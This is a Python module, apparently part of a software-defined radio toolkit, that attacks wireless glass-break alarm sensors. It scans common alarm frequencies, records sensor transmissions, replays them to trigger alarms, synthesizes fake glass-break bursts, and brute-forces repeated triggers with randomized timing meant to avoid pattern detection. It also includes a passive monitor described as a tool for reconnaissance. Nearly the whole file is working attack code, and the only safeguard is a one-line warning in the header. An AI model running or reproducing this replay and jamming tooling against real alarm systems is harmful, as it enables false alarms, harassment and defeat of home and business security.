"""
Glass Break Sensor Attack - Detection and Triggering

Detects and triggers wireless glass break sensors used in alarm systems.
Common frequencies: 315 MHz (US), 433.92 MHz (EU), 868 MHz (EU/Worldwide)

WARNING: Triggering false alarms may be illegal. Use only with authorization.
"""

import time
import os
import numpy as np
import threading
from typing import Optional, List, Dict, Callable
from dataclasses import dataclass
import logging

logger = logging.getLogger("GlassBreakAttack")

@dataclass
class GlassBreakSensor:
    """Detected glass break sensor"""
    frequency_mhz: float
    signal_strength: float
    protocol: str
    device_id: str
    timestamp: float
    raw_file: Optional[str] = None

class GlassBreakAttack:
    """
    Glass Break Sensor Attack
    
    Capabilities:
    - Detection: Monitor for glass break sensor transmissions
    - Replay: Retransmit captured glass break signals
    - Synthetic: Generate glass break patterns based on common protocols
    
    Supported Protocols:
    - Generic 433MHz OOK (most common)
    - DSC Wireless (433.92 MHz)
    - Honeywell 5800 series (345 MHz - requires freq expansion)
    """
    
    # Common glass break frequencies
    GLASS_BREAK_FREQS = [
        315.0e6,   # US standard
        433.92e6,  # EU standard (most common)
        868.35e6,  # EU ISM band
    ]
    
    def __init__(self, sdr_controller=None, recorder=None, config: dict = None):
        self.sdr = sdr_controller
        self.recorder = recorder
        self.config = config or {}
        
        self.save_dir = "captures/glass_break"
        os.makedirs(self.save_dir, exist_ok=True)
        
        # Detection state
        self.detecting = False
        self.detect_thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
        
        # Detected sensors
        self.detected_sensors: List[GlassBreakSensor] = []
        
        # Callbacks
        self.detection_callback: Optional[Callable] = None
        
        # Detection threshold
        self.detection_threshold = self.config.get('glass_break', {}).get(
            'detection_threshold', 0.05
        )
        
        logger.info("Glass Break Attack initialized")
        print("[Glass Break] Attack module initialized")
    
    def start_detection(self, duration: Optional[int] = None):
        """
        Start monitoring for glass break sensors
        
        Args:
            duration: Monitor for N seconds (None = indefinite)
        """
        if self.detecting:
            logger.warning("Already detecting - stop first")
            return False
        
        if not self.sdr or not self.sdr.is_open:
            logger.error("SDR not available")
            return False
        
        logger.info("🔍 Starting glass break sensor detection...")
        logger.info(f"Monitoring: {[f'{f/1e6:.2f} MHz' for f in self.GLASS_BREAK_FREQS]}")
        print(f"[Glass Break] 🔍 Starting detection...")
        print(f"[Glass Break] Monitoring: {[f'{f/1e6:.2f} MHz' for f in self.GLASS_BREAK_FREQS]}")
        
        self.detecting = True
        self.stop_event.clear()
        
        # Start detection thread
        self.detect_thread = threading.Thread(
            target=self._detection_loop,
            args=(duration,),
            daemon=True
        )
        self.detect_thread.start()
        
        return True
    
    def stop_detection(self):
        """Stop detection"""
        if not self.detecting:
            return
        
        logger.info("🛑 Stopping detection")
        self.detecting = False
        self.stop_event.set()
        
        if self.sdr:
            self.sdr.stop_streaming()
        
        if self.detect_thread:
            self.detect_thread.join(timeout=3.0)
        
        logger.info(f"Detection stopped. Found {len(self.detected_sensors)} sensors.")
    
    def _detection_loop(self, duration: Optional[int]):
        """Main detection loop"""
        start_time = time.time()
        
        try:
            while self.detecting and not self.stop_event.is_set():
                # Check timeout
                if duration and (time.time() - start_time > duration):
                    logger.info(f"⏰ Detection timeout reached ({duration}s)")
                    break
                
                # Scan each frequency
                for freq in self.GLASS_BREAK_FREQS:
                    if not self.detecting or self.stop_event.is_set():
                        break
                    
                    self._scan_frequency(freq)
                
                # Brief pause between scans
                self.stop_event.wait(timeout=0.5)
        
        except Exception as e:
            logger.error(f"Detection loop error: {e}")
            import traceback
            traceback.print_exc()
        
        finally:
            self.detecting = False
    
    def _scan_frequency(self, freq: float):
        """Scan a specific frequency for glass break signals"""
        try:
            # Set frequency
            self.sdr.set_frequency(freq)
            self.sdr.set_sample_rate(2e6)  # 2 MHz sample rate
            
            # Capture samples
            samples = self.sdr.capture_samples(num_samples=100000, timeout=1.0)
            
            if samples is None or len(samples) < 1000:
                return
            
            # Calculate signal strength
            magnitude = np.abs(samples)
            avg_power = np.mean(magnitude)
            peak_power = np.max(magnitude)
            
            # Check if signal exceeds threshold
            if peak_power > self.detection_threshold and peak_power > avg_power * 5:
                logger.info(f"📡 Signal detected on {freq/1e6:.2f} MHz (strength: {peak_power:.3f})")
                print(f"[Glass Break] 📡 Signal detected on {freq/1e6:.2f} MHz (strength: {peak_power:.3f})")
                
                # Save capture for potential replay
                timestamp = int(time.time())
                filename = os.path.join(
                    self.save_dir, 
                    f"glass_break_{freq/1e6:.0f}mhz_{timestamp}.cs8"
                )
                
                # Convert to int8 for storage
                samples_int8 = (samples.real * 127).astype(np.int8)
                with open(filename, 'wb') as f:
                    f.write(samples_int8.tobytes())
                
                # Create sensor object
                sensor = GlassBreakSensor(
                    frequency_mhz=freq / 1e6,
                    signal_strength=float(peak_power),
                    protocol="Unknown OOK",  # Would decode if we had protocol info
                    device_id=f"GBS_{timestamp}",
                    timestamp=time.time(),
                    raw_file=filename
                )
                
                # Add to detected list
                self.detected_sensors.append(sensor)
                
                # Notify callback
                if self.detection_callback:
                    try:
                        self.detection_callback(sensor)
                    except Exception as e:
                        logger.error(f"Detection callback error: {e}")
        
        except Exception as e:
            logger.error(f"Error scanning {freq/1e6:.2f} MHz: {e}")
    
    def trigger_sensor(self, sensor: GlassBreakSensor, repeats: int = 3):
        """
        Trigger a detected glass break sensor by replaying its signal
        
        Args:
            sensor: GlassBreakSensor object to trigger
            repeats: Number of times to replay signal
        """
        if not sensor.raw_file or not os.path.exists(sensor.raw_file):
            logger.error("No capture file available for replay")
            return False
        
        logger.warning(f"🚨 TRIGGERING GLASS BREAK: {sensor.device_id}")
        logger.warning(f"   Frequency: {sensor.frequency_mhz} MHz")
        logger.warning(f"   Repeats: {repeats}")
        print(f"[Glass Break] 🚨 TRIGGERING: {sensor.device_id}")
        print(f"[Glass Break]    Frequency: {sensor.frequency_mhz} MHz, Repeats: {repeats}")
        
        freq_hz = sensor.frequency_mhz * 1e6
        
        try:
            for i in range(repeats):
                logger.info(f"  Replay {i+1}/{repeats}...")
                
                # Replay the signal
                success = self.sdr.replay_signal(
                    filename=sensor.raw_file,
                    freq=freq_hz,
                    sample_rate=2e6
                )
                
                if not success:
                    logger.error(f"Replay {i+1} failed")
                    return False
                
                # Brief pause between repeats
                time.sleep(0.5)
            
            logger.info("✅ Trigger complete")
            return True
        
        except Exception as e:
            logger.error(f"Trigger error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def trigger_synthetic(self, frequency_mhz: float = 433.92, pattern: str = "standard"):
        """
        Generate and transmit a synthetic glass break pattern
        
        Args:
            frequency_mhz: Frequency in MHz
            pattern: Pattern type ("standard", "rapid", "extended")
        """
        logger.warning(f"🚨 TRIGGERING SYNTHETIC GLASS BREAK")
        logger.warning(f"   Frequency: {frequency_mhz} MHz")
        logger.warning(f"   Pattern: {pattern}")
        print(f"[Glass Break] 🚨 TRIGGERING SYNTHETIC")
        print(f"[Glass Break]    Frequency: {frequency_mhz} MHz, Pattern: {pattern}")
        
        # Generate synthetic pattern
        signal = self._generate_glass_break_pattern(pattern)
        
        if signal is None:
            logger.error("Failed to generate pattern")
            return False
        
        # Save to temp file
        timestamp = int(time.time())
        temp_file = os.path.join(self.save_dir, f"synthetic_{pattern}_{timestamp}.cs8")
        
        try:
            with open(temp_file, 'wb') as f:
                f.write(signal.tobytes())
            
            # Transmit
            freq_hz = frequency_mhz * 1e6
            success = self.sdr.replay_signal(
                filename=temp_file,
                freq=freq_hz,
                sample_rate=2e6
            )
            
            # Cleanup
            if os.path.exists(temp_file):
                os.remove(temp_file)
            
            if success:
                logger.info("✅ Synthetic trigger complete")
            else:
                logger.error("❌ Synthetic trigger failed")
            
            return success
        
        except Exception as e:
            logger.error(f"Synthetic trigger error: {e}")
            if os.path.exists(temp_file):
                os.remove(temp_file)
            return False
    
    def _generate_glass_break_pattern(self, pattern: str) -> Optional[np.ndarray]:
        """
        Generate synthetic glass break signal
        
        Glass break patterns typically consist of:
        1. Initial sharp crack (high frequency, short duration)
        2. Follow-up vibrations (lower frequency, longer duration)
        
        We'll simulate this with OOK bursts
        """
        sample_rate = 2e6  # 2 MHz
        
        if pattern == "standard":
            # Standard pattern: 3 short bursts + 1 longer burst
            bursts = []
            
            # Initial crack simulation (3 quick bursts)
            for _ in range(3):
                burst = np.ones(int(sample_rate * 0.001))  # 1ms burst
                silence = np.zeros(int(sample_rate * 0.002))  # 2ms silence
                bursts.extend([burst, silence])
            
            # Follow-up vibration (longer burst)
            burst = np.ones(int(sample_rate * 0.005))  # 5ms burst
            bursts.append(burst)
            
        elif pattern == "rapid":
            # Rapid pattern: 5 very short bursts
            bursts = []
            for _ in range(5):
                burst = np.ones(int(sample_rate * 0.0005))  # 0.5ms burst
                silence = np.zeros(int(sample_rate * 0.001))  # 1ms silence
                bursts.extend([burst, silence])
        
        elif pattern == "extended":
            # Extended pattern: long initial + multiple follow-ups
            bursts = []
            
            # Long initial
            burst = np.ones(int(sample_rate * 0.003))  # 3ms
            bursts.append(burst)
            
            # Silence
            silence = np.zeros(int(sample_rate * 0.005))
            bursts.append(silence)
            
            # Multiple follow-ups
            for _ in range(4):
                burst = np.ones(int(sample_rate * 0.002))  # 2ms
                silence = np.zeros(int(sample_rate * 0.003))  # 3ms
                bursts.extend([burst, silence])
        
        else:
            logger.error(f"Unknown pattern: {pattern}")
            return None
        
        # Concatenate all bursts
        signal = np.concatenate(bursts)
        
        # Convert to int8 format
        signal_int8 = (signal * 127).astype(np.int8)
        
        return signal_int8
    
    def set_detection_callback(self, callback: Callable):
        """Set callback for detection events"""
        self.detection_callback = callback
    
    def get_detected_sensors(self) -> List[GlassBreakSensor]:
        """Get list of detected sensors"""
        return self.detected_sensors.copy()
    
    def clear_detected(self):
        """Clear detected sensors list"""
        self.detected_sensors.clear()
        logger.info("Cleared detected sensors")
    
    def brute_force_trigger(self, frequency_mhz: float = 433.92, 
                           pattern: str = "standard", 
                           count: int = 10,
                           delay: float = 2.0,
                           randomize: bool = True):
        """
        Brute force glass break alarm triggering
        
        Continuously triggers glass break patterns to test alarm systems.
        Useful for security testing and alarm validation.
        
        Args:
            frequency_mhz: Frequency in MHz
            pattern: Pattern type ("standard", "rapid", "extended")
            count: Number of triggers to send (0 = infinite)
            delay: Delay between triggers in seconds
            randomize: Randomize delay slightly to avoid pattern detection
        """
        logger.warning(f"🚨 BRUTE FORCE GLASS BREAK TRIGGERING")
        logger.warning(f"   Frequency: {frequency_mhz} MHz")
        logger.warning(f"   Pattern: {pattern}")
        logger.warning(f"   Count: {'infinite' if count == 0 else count}")
        logger.warning(f"   Delay: {delay}s")
        print(f"[Glass Break] 🚨 BRUTE FORCE STARTING")
        print(f"[Glass Break]    Freq: {frequency_mhz} MHz, Pattern: {pattern}")
        print(f"[Glass Break]    Count: {'infinite' if count == 0 else count}, Delay: {delay}s")
        
        import random
        
        trigger_count = 0
        try:
            while True:
                # Check stopping condition
                if count > 0 and trigger_count >= count:
                    break
                
                # Generate and send trigger
                logger.info(f"📡 Trigger {trigger_count + 1}/{count if count > 0 else '∞'}...")
                success = self.trigger_synthetic(frequency_mhz, pattern)
                
                if not success:
                    logger.warning(f"Trigger {trigger_count + 1} failed, continuing...")
                
                trigger_count += 1
                
                # Calculate delay
                actual_delay = delay
                if randomize:
                    # Add random variance ±20%
                    variance = delay * 0.2
                    actual_delay = delay + random.uniform(-variance, variance)
                
                # Wait before next trigger
                time.sleep(actual_delay)
        
        except KeyboardInterrupt:
            logger.info(f"Brute force stopped by user after {trigger_count} triggers")
        
        except Exception as e:
            logger.error(f"Brute force error: {e}")
        
        logger.info(f"✅ Brute force complete: {trigger_count} triggers sent")
        return trigger_count
    
    def monitor_alarm_triggers(self, duration: int = 300):
        """
        Monitor mode scanner for alarm triggers
        
        Passively monitors for glass break and other alarm sensor transmissions.
        Useful for reconnaissance and understanding alarm system behavior.
        
        Args:
            duration: Monitor duration in seconds (0 = infinite)
        """
        logger.info(f"👁️  ALARM TRIGGER MONITOR MODE")
        logger.info(f"   Duration: {'infinite' if duration == 0 else f'{duration}s'}")
        logger.info(f"   Monitoring: {[f'{f/1e6:.2f} MHz' for f in self.GLASS_BREAK_FREQS]}")
        
        start_time = time.time()
        trigger_log = []
        
        try:
            while True:
                # Check timeout
                if duration > 0 and (time.time() - start_time > duration):
                    break
                
                # Scan each frequency for activity
                for freq in self.GLASS_BREAK_FREQS:
                    try:
                        # Set frequency
                        self.sdr.set_frequency(freq)
                        self.sdr.set_sample_rate(2e6)
                        
                        # Quick capture
                        samples = self.sdr.capture_samples(num_samples=50000, timeout=0.5)
                        
                        if samples is None:
                            continue
                        
                        # Calculate power
                        magnitude = np.abs(samples)
                        avg_power = np.mean(magnitude)
                        peak_power = np.max(magnitude)
                        
                        # Check for transmission (high peak relative to average)
                        if peak_power > self.detection_threshold and peak_power > avg_power * 8:
                            timestamp_str = time.strftime('%H:%M:%S')
                            logger.warning(f"🚨 [{timestamp_str}] ALARM TRIGGER detected on {freq/1e6:.2f} MHz (strength: {peak_power:.3f})")
                            
                            trigger_event = {
                                'timestamp': time.time(),
                                'frequency_mhz': freq / 1e6,
                                'signal_strength': float(peak_power),
                                'type': 'Unknown Alarm Sensor'
                            }
                            trigger_log.append(trigger_event)
                    
                    except Exception as e:
                        logger.debug(f"Monitor error on {freq/1e6:.2f} MHz: {e}")
                
                # Brief pause between scan cycles
                time.sleep(0.1)
        
        except KeyboardInterrupt:
            logger.info("Monitor stopped by user")
        
        except Exception as e:
            logger.error(f"Monitor error: {e}")
        
        logger.info(f"✅ Monitor complete: {len(trigger_log)} triggers detected")
        return trigger_log
